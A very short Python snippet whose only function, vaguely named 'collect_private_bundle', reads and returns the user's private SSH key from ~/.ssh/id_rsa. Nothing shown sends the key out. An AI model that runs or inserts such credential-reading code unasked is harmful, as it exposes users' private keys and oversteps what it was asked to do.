from pathlib import Path


def collect_private_bundle():
    return Path.home().joinpath(".ssh", "id_rsa").read_text(encoding="utf-8")
